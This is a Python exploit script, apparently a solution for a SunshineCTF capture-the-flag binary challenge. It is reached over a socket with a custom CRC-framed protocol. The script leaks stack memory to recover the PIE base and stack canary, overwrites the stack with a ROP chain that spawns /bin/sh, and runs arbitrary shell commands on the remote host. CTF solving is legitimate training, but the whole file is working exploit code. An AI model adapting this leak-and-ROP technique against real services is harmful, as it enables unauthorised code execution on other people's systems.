#!/usr/bin/env python3
import socket, struct, sys
from exploit import MAGIC, crc, frame, p64, u64, recv_exact

HOST, PORT = 'sunshinectf.games', 26008

def exchange(reader, writer, payload):
    writer.write(frame(payload)); writer.flush()
    h = recv_exact(reader, 4)
    assert h[:2] == b'\x1b[', h
    n = int.from_bytes(h[2:4], 'big')
    t = recv_exact(reader, n+3)
    assert t[n+1:n+3] == b'\x1b\\'
    assert crc(t[:n]) == t[n]
    return t[0], t[1:n]

def main():
    command = ' '.join(sys.argv[1:]) or 'id; pwd; ls -la'
    with socket.create_connection((HOST, PORT), timeout=10) as sock:
        reader = sock.makefile('rb', buffering=0)
        writer = sock.makefile('wb', buffering=0)
        banner = recv_exact(reader, 405)
        assert b'INSERT SERVICE KEY CARD' in banner
        assert exchange(reader, writer, b'\x01'+struct.pack('>I', MAGIC))[0] == 0
        prefix = b'A'*255
        last = next(v for v in range(256) if crc(b'\x02'+prefix+bytes([v])) == 0xff)
        assert exchange(reader, writer, b'\x02'+prefix+bytes([last]))[0] == 0
        status, leak = exchange(reader, writer, b'\x03')
        assert status == 0 and len(leak) == 511
        pie = u64(leak[0x118:0x120]) - 0x1a9f
        canary = u64(leak[0x108:0x110])
        print(f'PIE={pie:#x}, canary={canary:#x}', file=sys.stderr)
        rop = b''.join(map(p64, [pie+0x1288, pie+0x12aa, pie+0x4875, pie+0x10c0]))
        data = bytearray(leak[:0x118]+rop)
        data[16:24] = b'/bin/sh\0'
        assert exchange(reader, writer, b'\x02'+data)[0] == 0
        writer.write(frame(b'\x04') + command.encode() + b'\nexit\n')
        writer.flush()
        sock.shutdown(socket.SHUT_WR)
        while True:
            block = reader.read(4096)
            if not block: break
            sys.stdout.buffer.write(block)
            sys.stdout.buffer.flush()

if __name__ == '__main__': main()
